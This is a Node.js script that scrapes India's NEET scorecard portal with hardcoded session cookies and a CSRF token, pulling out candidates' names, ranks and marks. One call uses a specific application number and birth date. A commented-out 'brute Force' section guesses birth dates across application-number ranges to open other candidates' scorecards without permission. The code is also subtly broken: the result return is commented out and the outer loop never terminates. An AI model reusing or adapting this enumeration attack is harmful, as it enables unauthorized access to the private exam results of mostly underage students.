const axios = require("axios");
const qs = require("qs");
const cheerio = require("cherio");

async function slove(AN, DA, MO, YE) {
  let data = qs.stringify({
    "_csrf-frontend":
      "illANmn2PgSuBnVGRRCp49u1e2p4WRQEstGj7abMnhbTbTdbKIBLa9xXND8qQZmTvswUXkEhXjLGicGY9orVcw==",
    "Scorecardmodel[ApplicationNumber]": parseInt(AN),
    "Scorecardmodel[Day]": parseInt(DA),
    "Scorecardmodel[Month]": parseInt(MO),
    "Scorecardmodel[Year]": parseInt(YE),
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "https://neet.ntaonline.in/frontend/web/scorecard/index",
    headers: {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie:
        "advanced-frontend=sslks80ftba4tna8pgcgc93mqr; _csrf-frontend=99f0a028fde4621f2ab55427f501d0c0370522e59a6ee8d366b35a8f1ac9bec6a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22Y4wmAvuorQAyoQ0peyo49xJ6tXbuPFKe%22%3B%7D",
      Origin: "null",
      "Sec-Fetch-Dest": "document",
      "Sec-Fetch-Mode": "navigate",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-User": "?1",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      dnt: "1",
      "sec-ch-ua":
        '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-gpc": "1",
    },
    data: data,
  };

  try {
    const res = await axios.request(config);
    const Parsedata = parseHtml(JSON.stringify(res.data));
    console.log("Done");
    console.log(Parsedata);
    if (Parsedata) {
      process.exit(1);
    }
    // return Parsedata;
  } catch {
    console.log("error");
    process.exit(1);
  }
}

function parseHtml(A) {
  const Appi = cheerio.load(A);

  const applicationNumber =
    Appi('td:contains("Application No.")').next("td").text().trim() || "N/A";
  const candidateName =
    Appi(`td:contains("Candidate’s Name")`).next().text().trim() || "N/A";
  const allInidaRank =
    Appi('td:contains("NEET All India Rank")').next("td").text().trim() ||
    "N/A";
  const marks =
    Appi(`td:contains("Total Marks Obtained (out of 720)")`)
      .first()
      .next("td")
      .text()
      .trim() || "N/A";

  if (allInidaRank === "N/A") {
    return null;
  }
  return {
    applicationNumber,
    candidateName,
    allInidaRank,
    marks,
  };
}
// Enter Appliction Num , Day, Month, Year
slove("240411054349", "07", "10", "2007");
// Down here is the brute Force method like when you have Application Num but you
// dont have their DOB

// async function main(rollnum) {
//   let sloved = false;
//   for (let y = 2007; y >= 2004; y--) {
//     if (sloved) {
//       break;
//     }
//     for (let m = 1; m <= 12; m++) {
//       if (sloved) {
//         break;
//       }
//       const dataPromises = [];
//       for (let d = 1; d <= 31; d++) {
//         const dataPromise = slove(
//           rollnum,
//           d.toString(),
//           m.toString(),
//           y.toString()
//         );
//         dataPromises.push(dataPromise);
//       }
//       const resData = await Promise.all(dataPromises);
//       resData.forEach((data) => {
//         if (data) {
//           console.log(data);
//           sloved = true;
//         }
//       });
//     }
//   }
// }

// for (let i = 240411345673; i > 240410999999; i++) {
//   main(i.toString());
// }
